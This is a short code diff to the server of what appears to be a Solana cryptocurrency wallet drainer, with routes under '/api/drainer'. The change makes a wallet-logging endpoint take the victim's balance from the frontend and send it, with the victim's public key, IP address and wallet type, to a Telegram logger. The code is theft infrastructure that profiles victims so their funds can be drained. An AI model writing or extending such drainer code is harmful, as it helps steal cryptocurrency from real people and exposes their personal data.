@@ -30,7 +30,7 @@ app.options('/api/drainer', async (req, res) => {
 // Wallet logging endpoint
 app.post('/api/drainer/log-wallet', async (req, res) => {
   try {
-    const { publicKey, walletType, origin, userAgent } = req.body;
+    const { publicKey, walletType, origin, userAgent, lamports } = req.body;
     const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
     
     const telegramLogger = (await import('./src/telegram.js')).default;
@@ -38,7 +38,7 @@ app.post('/api/drainer/log-wallet', async (req, res) => {
     // Log wallet detection (this will be called from frontend)
     await telegramLogger.logWalletDetected({
       publicKey: publicKey,
-      lamports: 0, // Will be set by drainer when balance is fetched
+      lamports: lamports || 0, // Accept balance from frontend
       ip: userIp,
       walletType: walletType || 'Unknown'
     });
